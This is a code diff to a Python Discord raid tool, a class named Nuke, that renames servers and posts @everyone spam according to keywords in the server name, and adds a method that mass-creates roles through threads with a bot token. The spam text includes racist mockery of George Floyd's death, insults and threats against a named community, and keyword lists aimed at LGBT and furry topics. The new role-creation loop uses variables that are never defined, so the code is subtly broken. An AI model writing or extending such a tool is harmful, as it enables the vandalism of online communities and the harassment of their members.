@@ -91,7 +91,7 @@ class Nuke:
         elif any(word in sername for word in betrayal):
             name = 'im so sorry 😭😭💔'
         elif any(word in sername for word in mibu):
-            name = 'i cant breathe'
+            name = 'justice for joshua'
         elif any(word in sername for word in rblx):
             name = 'roblox a diddy game'
         elif any(word in sername for word in sigma):
@@ -124,7 +124,7 @@ class Nuke:
         sigma = ['antifurry', 'antilgbt', 'anti lgbt', 'anti furry', 'afu', 'homophobic']
         rblx = ["dandy's world", 'gag', 'grow a garden', 'steal a brainrot', 'forsaken', 'pc2', 'pillar chase', 'doors', 'roblox', 'rblx', 'schlep', 'spawnism']
         betrayal = ['gassy', 'diddyblud', 'sigma', 'dih', 'india', 'george floyd', 'george droyd', 'george droid']
-        mibu = ['mr incredible', 'mibu', 'phase', 'template', 'uncanny', 'verst']
+        mibu = ['mr incredible', 'mibu', 'phase', 'template', 'uncanny', 'verst', 'super gaming house']
 
         sername = self.server.lower()
         if any(word in sername for word in mc):
@@ -132,7 +132,7 @@ class Nuke:
         elif any(word in sername for word in betrayal):
             msg = 'i feel so bad im not even gonna ping'
         elif any(word in sername for word in mibu):
-            msg = "||@everyone|| George Floyd's last words.... I CANT BREATHE https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTA_eX7i1SayGHRUjWZ0sXLJm-JGbt_LlHZKw&s https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_6IaXU8yqoQHWUtpKhN9D77f68Ij8mt5d6w&s https://i1.sndcdn.com/avatars-zaCUjzWzmpQ5cqzn-4EqdxQ-t1080x1080.jpg https://pbs.twimg.com/media/GSLgbVVWAAA-9hv?format=jpg https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5HJnR_06EWomHKncyZL_Q223mmmUTr3MYfw&s"
+            msg = "||@everyone|| JUSTICE FOR JOSHUA YOU M*BU FUCKS WILL PAY FOR WHAT YOU DID TO HIM"
         elif any(word in sername for word in rblx):
             msg = '||@everyone|| https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRhpj1yM8IEjc05Z7yT6l4w74DOo7aQv02mQ&s'
         elif any(word in sername for word in sigma):
@@ -254,3 +254,25 @@ class Nuke:
         else:
             Logging.fail(f'Failed to edit the server {r.text}')
 
+    def createrole(self, serverid, name):
+        payload = {
+            'name': name,
+        }
+        r = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/roles', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
+        if r.status_code in [200, 201, 204]:
+            rjs = r.json()
+            Logging.success(f'Successfully created role {rjs["id"]}')
+        elif r.status_code == 429:
+            Logging.info('Rate limit response while trying to create role')
+        else:
+            Logging.fail(f'Failed to create role: {r.status_code} {r.text}')
+            
+    def CRoles(self, serverid):
+        for channel in channels:
+            t = threading.Thread(target=self.createrole, args=(serverid, name,))
+            threads.append(t)
+            t.start()
+            time.sleep(0.01)
+        
+        for t in threads:
+            t.join()
